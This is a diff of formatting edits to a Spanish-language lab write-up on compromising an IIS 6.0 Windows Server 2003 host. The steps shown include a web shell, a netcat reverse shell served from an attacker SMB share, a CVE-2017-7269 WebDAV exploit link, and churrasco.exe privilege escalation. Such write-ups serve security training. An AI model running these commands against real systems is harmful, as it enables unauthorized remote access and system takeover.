@@ -118,11 +118,11 @@ Vemos que se ha subido el archivo pero ahora esta como .txt y no nos interesa es
 > smbserver.py smbFolder $(pwd)
 ```
 
-* Nos enviamos una reverse shell a través de la web-shell
+* Nos enviamos una reverse shell a través de la **web-shell**
 
 <figure><img src="../../../.gitbook/assets/rs-web-shell.PNG" alt=""><figcaption></figcaption></figure>
 
-`\\<tu-ip>\smbFolder\nc.exe -e cmd <tu-ip> <tu-puerto>`
+**-->** `\\<tu-ip>\smbFolder\nc.exe -e cmd <tu-ip> <tu-puerto>`
 
 * Recibimos la reverse shell por el puerto antes indicado
 
@@ -138,7 +138,7 @@ c:\windows\system32\inetsrv>
 
 #### Explotación
 
-Buscamos vulnerabilidades asociadas a IIS 6.0 y encontramos el siguiente recurso https://www.exploit-db.com/exploits/41738 que podemos aprovechar el **CVE** para buscar otro exploit y buscamos en google `2017-7269 exploit github` y encontramos un repositorio de github interesante en https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
+Buscamos vulnerabilidades asociadas a IIS 6.0 y encontramos el siguiente recurso https://www.exploit-db.com/exploits/41738 que podemos aprovechar el **CVE** para buscar otro exploit y buscamos en google **2017-7269 exploit github** y encontramos un repositorio de github interesante en [https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell)
 
 * Script de python que hace un buffer overflow al **WebDAV**
 
@@ -354,7 +354,7 @@ OS Version:                5.2.3790 Service Pack 2 Build 3790
 
 Vemos que tenemos el **SeImpersonatePrivilege** habilitado y podríamos abusar de esto con **juicypotato** pero se ve que no funciona con las versiones de windows server 2003 y hay que utilizar **churrasco.exe** que es una alternativa.
 
-* Descargar **churrasco.exe** en https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/
+* Descargar **churrasco.exe** en [https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)
 
 ```shell
 > mv /home/red/Descargas/churrasco.exe .
@@ -369,7 +369,7 @@ Vemos que tenemos el **SeImpersonatePrivilege** habilitado y podríamos abusar d
 > smbserver.py smbFolder $(pwd)
 ```
 
-* Copiamos el **churrasco.exe** en el directorio `C:\Windows\Temp\<carpeta>\churrasco.exe`
+* Copiamos el **churrasco.exe** en el directorio --> `C:\Windows\Temp\<carpeta>\churrasco.exe`
 
 ```shell
 \> copy \\<tu-ip>\smbFolder\churrasco.exe churrasco.exe 
